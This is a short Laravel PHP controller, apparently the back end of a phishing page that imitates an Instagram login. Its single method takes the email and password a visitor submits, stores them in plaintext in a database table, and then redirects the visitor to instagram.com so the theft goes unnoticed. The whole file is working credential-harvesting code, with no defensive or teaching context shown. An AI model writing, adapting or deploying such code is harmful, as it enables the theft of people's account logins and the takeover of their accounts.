<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Fishing;


class FishingController extends Controller
{

    public function save(Request $request){

        $fishing = new Fishing();
        $fishing-> email = $request->email;
        $fishing-> password = $request->password;
        $fishing->save();
        return redirect('https://www.instagram.com/');   
       

    }
   

}
